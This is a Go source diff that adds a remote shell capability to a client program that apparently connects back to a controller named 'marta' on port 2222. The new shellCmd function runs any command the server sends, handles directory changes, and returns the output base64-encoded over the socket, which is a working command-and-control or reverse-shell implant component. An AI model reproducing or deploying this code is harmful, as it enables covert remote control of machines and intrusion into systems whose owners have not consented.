@@ -4,13 +4,19 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
+	"fmt"
 	"log"
 	"net"
+	"os"
+	"os/exec"
+	"strings"
 	"time"
 )
 
 const marta = "127.0.0.1"
 const port = 2222
+const delimiter string = "#+2%&"
 
 var server *Server
 var logger *log.Logger
@@ -88,6 +94,8 @@ func handleData(data string) {
 		ping(cmd)
 	case "info":
 		info(cmd)
+	case "initshell", "closeshell", "shell":
+		shellCmd(cmd)
 	}
 }
 
@@ -111,6 +119,67 @@ func info(cmd *Command) error {
 	return nil
 }
 
+// Executes the arguments of `cmd` as shell command and returns output.
+func shellCmd(cmd *Command) (err error) {
+
+	if cmd.CmdType == "initshell" {
+		logger.Println("Shell initialized by marta.")
+		cmd.Args = []string{"cd", "."}
+	} else if cmd.CmdType == "closeshell" {
+		logger.Println("Shell closed by marta.")
+		return
+	}
+
+	// toSend builder will store the response
+	toSend := strings.Builder{}
+
+	// server wants to change working dir
+	if cmd.Args[0] == "cd" {
+		var newDir string
+
+		if len(cmd.Args) > 1 {
+			newDir = cmd.Args[1]
+		} else {
+			newDir, _ = os.UserHomeDir()
+		}
+		err = os.Chdir(newDir)
+
+		// append error to response
+		if err != nil {
+			toSend.WriteString(err.Error())
+		}
+
+	} else {
+
+		var stdout []byte
+
+		execCmd := exec.Command(cmd.Args[0], cmd.Args[1:]...)
+		stdout, err = execCmd.Output()
+
+		// append error to response
+		if err != nil {
+			fmt.Println(err)
+			toSend.WriteString(err.Error())
+		}
+
+		// append output to response
+		toSend.Write(stdout)
+	}
+
+	wd, _ := os.Getwd()
+
+	// append delimiter and working directory to response
+	toSend.WriteString(delimiter + wd)
+
+	// send response as base64, so the newlines dont let the server think the res is over
+	sendAsBase64([]byte(toSend.String()))
+
+	// send delimiter
+	send("\n")
+
+	return err
+}
+
 // Converts data to bytes and sends it to the server.
 func sendBytes(data []byte) {
 	server.Conn.Write(data)
@@ -119,4 +188,12 @@ func sendBytes(data []byte) {
 // Converts data to bytes and sends it to the server.
 func send(data string) {
 	server.Conn.Write([]byte(data))
+}
+
+// Converts data to base64 and sends it to the server.
+func sendAsBase64(data []byte) {
+	dst := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
+	base64.StdEncoding.Encode(dst, data)
+
+	server.Conn.Write(dst)
 }
